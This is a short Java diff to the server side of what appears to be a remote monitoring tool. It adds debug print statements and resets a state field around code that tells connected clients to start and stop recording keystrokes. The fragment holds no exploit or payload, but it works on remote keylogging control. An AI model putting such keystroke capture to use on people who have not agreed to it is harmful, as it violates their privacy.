@@ -117,6 +117,7 @@ class Connection implements Runnable {
 					try {
 						// Sends a request packet to the client to start keylogging functions
 						output.writeBytes(header + System.getProperty("line.separator"));
+						System.out.println("KEYLOG REQUEST SENT");
 
 						// Keep listening until thread is interrupted
 						BufferedReader bufferedInput = new BufferedReader(input);
@@ -132,10 +133,13 @@ class Connection implements Runnable {
 
 						// Once thread is interrupted, send message to client to stop recording keystrokes
 						output.writeBytes(header + System.getProperty("line.separator"));
-
+						System.out.println("KEYLOG DESIST SENT");
+						operation = null;
+						
 					} catch (IOException e) { // IOException means the client disconnected
 						shutdown(); 
 						RemoteMonitorServer.displayConnectionCutDialog(connection.getInetAddress());
+						operation = null;
 					}
 				}
 			});
